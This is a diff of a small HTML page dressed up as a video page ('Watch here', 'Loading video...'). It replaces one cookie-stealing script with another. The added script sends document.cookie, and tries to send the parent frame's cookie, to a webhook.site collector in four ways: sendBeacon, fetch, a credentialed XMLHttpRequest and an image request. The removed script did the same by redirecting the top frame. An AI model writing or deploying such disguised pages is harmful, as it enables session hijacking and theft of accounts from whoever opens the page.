@@ -1,20 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Funny Page</title>
+    <title>Watch here</title>
 </head>
 <body>
-    <h1>Watch here</h1>
+    <h1>Loading video...</h1>
     <script>
-        window.addEventListener('DOMContentLoaded', () => {
-            try {
-                // Try to navigate the top frame to send cookies
-                top.location = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?cookie=' + encodeURIComponent(document.cookie);
-            } catch(e) {
-                // If navigation fails, try to send via fetch
-                fetch('https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?error=' + encodeURIComponent(e.message));
-            }
-        });
+        // Method 1: Direct cookie access and beacon
+        navigator.sendBeacon('https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?m1=' + document.cookie);
+        
+        // Method 2: Try to access parent frame
+        try {
+            const parentCookie = window.parent.document.cookie;
+            fetch('https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?m2=' + parentCookie);
+        } catch(e) {}
+
+        // Method 3: XMLHttpRequest with credentials
+        const xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        xhr.open('GET', 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?m3=' + document.cookie);
+        xhr.send();
+
+        // Method 4: Create an image with cookie in URL
+        new Image().src = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?m4=' + document.cookie;
+
+        // Method 5: Display cookies on page itself
+        document.body.innerHTML += '<div>Cookies: ' + document.cookie + '</div>';
     </script>
 </body>
 </html>
